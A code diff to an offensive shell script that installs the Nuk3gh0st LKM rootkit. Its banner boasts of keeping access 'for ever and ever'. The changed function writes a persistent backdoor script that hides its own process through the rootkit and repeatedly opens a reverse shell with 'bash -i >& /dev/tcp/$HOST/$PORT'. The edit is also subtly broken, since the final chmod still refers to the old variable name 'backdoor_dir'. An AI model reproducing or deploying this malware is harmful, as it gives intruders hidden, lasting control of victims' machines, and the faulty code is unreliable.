@@ -29,7 +29,7 @@ function print_banner {
 	echo -e "${green}           	   with Nuk3gh0st LKM rootkit                   ${endColor}"
 	echo -e "${green}   								${endColor}"
 	echo -e "${green}   		        In other words...			${endColor}"
-	echo -e "${green}   	    YOU CAN MANTAIN ACCESS FOREVER AND EVER!   		${endColor}"
+	echo -e "${green}   	    YOU CAN MANTAIN ACCESS FOR EVER AND EVER!   	${endColor}"
 	echo -e "${green}                                                               ${endColor}"
 	echo -e "${green}                                                               ${endColor}"
 }
@@ -53,15 +53,17 @@ function show_help {
 }
 
 function generate_backdoor {
-	backdoor_dir='/usr/share/nuk3gh0st/backdoor'
-	echo "#!/bin/bash" > $backdoor_dir
-	echo "" >> $backdoor_dir
-	echo "while true" >> $backdoor_dir
-	echo "do" >> $backdoor_dir
-	echo "	sleep $SLEEP" >> $backdoor_dir
-	echo "  nuk3gh0st --hide-pid=\`ps -ef | awk '$8=="/bin/bash" {print $2}'\`" >> $backdoor_dir
-	echo "	bash -i >& /dev/tcp/$HOST/$PORT 0>&1" >> $backdoor_dir
-	echo "done" >> $backdoor_dir
+	backdoor_path='/usr/share/nuk3gh0st/backdoor'
+	echo "#!/bin/bash" > $backdoor_path
+	echo "" >> $backdoor_path
+	echo "sleep 40" >> $backdoor_path
+	echo "/usr/bin/nuk3gh0st --hide-pid=\`echo $$\`" >> $backdoor_path
+	echo "" >> $backdoor_path
+	echo "while true" >> $backdoor_path
+	echo "do" >> $backdoor_path
+	echo "	bash -i >& /dev/tcp/$HOST/$PORT 0>&1" >> $backdoor_path
+	echo "	sleep $SLEEP" >> $backdoor_path
+	echo "done" >> $backdoor_path
 	chmod +x $backdoor_dir
 }
 
